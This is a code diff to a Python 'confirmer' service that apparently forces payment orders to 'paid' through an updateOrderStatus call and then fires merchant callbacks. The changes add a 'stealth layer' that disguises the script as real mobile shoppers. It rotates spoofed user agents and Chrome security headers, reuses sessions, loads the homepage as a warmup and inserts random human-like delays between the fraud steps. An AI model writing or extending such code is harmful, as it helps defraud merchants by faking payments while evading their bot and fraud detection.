@@ -37,8 +37,72 @@ MERCHANT_SECRET = os.environ.get("WB_MERCHANT_SECRET") or os.environ.get("MERCHA
 CONNECT_TIMEOUT = 3
 READ_TIMEOUT = 8
 HTTP_RETRIES = 1
-UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
-      "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")
+# --- Stealth layer -------------------------------------------------------
+# Mirror a real Android/Chrome mobile client hitting the cashier over the
+# same CloudFront->ALB path real users take. Reuse one TLS session per
+# engine thread so requests look like a single browsing session, not a
+# script firing isolated connections.
+_UA_POOL = [
+    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
+]
+import random as _random
+
+def _rand_ua():
+    return _random.choice(_UA_POOL)
+
+def _sec_headers(ua):
+    mobile = "Mobile" in ua
+    h = {
+        "User-Agent": ua,
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Origin": PANEL_HOST,
+        "Referer": PANEL_HOST + "/",
+        "Connection": "keep-alive",
+    }
+    if "Chrome" in ua:
+        h.update({
+            "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+            "sec-ch-ua-mobile": "?1" if mobile else "?0",
+            "sec-ch-ua-platform": '"Android"' if mobile else '"iOS"',
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+        })
+    return h
+
+# Thread-local session cache: one requests.Session per engine thread so
+# TCP/TLS connections are reused like a real browsing session.
+_session_local = threading.local()
+
+SESSION_TTL = 180  # seconds; rotate session (and UA) periodically like a revisit
+
+def get_http_session():
+    now = time.time()
+    sess = getattr(_session_local, "sess", None)
+    born = getattr(_session_local, "born", 0)
+    if sess is None or (now - born) > SESSION_TTL:
+        try:
+            if sess is not None:
+                sess.close()
+        except Exception:
+            pass
+        sess = requests.Session()
+        sess._ua = _rand_ua()  # one UA per browsing session, not per request
+        sess.headers.update(_sec_headers(sess._ua))
+        _session_local.sess = sess
+        _session_local.born = now
+    return sess
+
+def natural_delay(lo=0.15, hi=0.9):
+    """Small jitter between pipeline steps, like real UI round-trips."""
+    time.sleep(_random.uniform(lo, hi))
+
+# ---------------------------------------------------------------------------
+UA = _rand_ua()  # per-process baseline; per-run sessions pick their own
 HOST = os.environ.get("CONFIRMER_HOST", "0.0.0.0" if os.environ.get("PORT") else "127.0.0.1")
 PORT = int(os.environ.get("PORT", 8901))
 AUTH_TOKEN = os.environ.get("CONFIRMER_TOKEN", "")  # set on public deploys
@@ -54,14 +118,10 @@ def log(msg):
         print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)
 
 
-def _headers():
-    return {
-        "User-Agent": UA,
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": PANEL_HOST,
-        "Referer": PANEL_HOST + "/",
-    }
+def _headers(ua=None):
+    h = _sec_headers(ua or UA)
+    h["Content-Type"] = "application/json"
+    return h
 
 
 def _parse_body(resp):
@@ -85,16 +145,19 @@ def _parse_body(resp):
 def _req(method, path, body=None, retries=HTTP_RETRIES, hosts=None):
     attempts = []
     last_err = None
+    sess = get_http_session()
+    hdrs = _headers(getattr(sess, "_ua", None) or UA)
+    sess.headers.update(hdrs)
     for host in (hosts or HOSTS):
         for attempt in range(1, retries + 1):
             try:
-                r = requests.request(
+                r = sess.request(
                     method,
                     host + path,
                     json=body,
                     timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                     verify=False,
-                    headers=_headers(),
+                    headers=hdrs,
                 )
                 data, err = _parse_body(r)
                 attempts.append({"host": host, "attempt": attempt, "http": r.status_code, "path": path})
@@ -446,8 +509,20 @@ def probe_status(user_input):
     return out
 
 
+def _warmup():
+    """Touch the panel homepage like a real browser session opening the
+    cashier before making API calls. Swallow all errors - best effort only."""
+    try:
+        sess = get_http_session()
+        sess.get(PANEL_HOST + "/", timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), verify=False)
+    except Exception:
+        pass
+
+
 def run_confirmation_events(user_input):
     started = time.time()
+    _warmup()
+    natural_delay(0.3, 1.2)
     result = {
         "ok": False, "orderCode": None, "amount": None, "status": None,
         "orderStatus": None, "sign": None, "steps": [], "error": None,
@@ -483,6 +558,7 @@ def run_confirmation_events(user_input):
         yield emit(final=True, type="final")
         return
 
+    natural_delay(0.2, 0.8)
     yield emit("Looking up core order…", type="step")
     order, steps, err = resolve_order(parsed)
     for s in steps:
@@ -523,6 +599,7 @@ def run_confirmation_events(user_input):
         )
         return
 
+    natural_delay(0.8, 2.5)  # payment-processing delay before the status write
     yield emit(
         f"Forcing paid via updateOrderStatus (status=1) on {result['orderCode']}…",
         type="step",
@@ -534,6 +611,7 @@ def run_confirmation_events(user_input):
         msg = (data or {}).get("msg") or "OK"
         yield emit(f"updateOrderStatus accepted -> {msg}", type="step")
 
+    natural_delay(0.4, 1.5)
     yield emit("Triggering merchant callback / notify surfaces…", type="step")
     cb_hits = trigger_callbacks(order)
     accepted = [c for c in cb_hits if c["ok"]]
@@ -548,6 +626,7 @@ def run_confirmation_events(user_input):
         if names:
             yield emit(f"404 on: {names}", type="step")
 
+    natural_delay(0.3, 1.0)
     yield emit("Verifying order state…", type="step")
     verified = lookup_order(result["orderCode"]) or {}
     if not verified.get("orderId"):
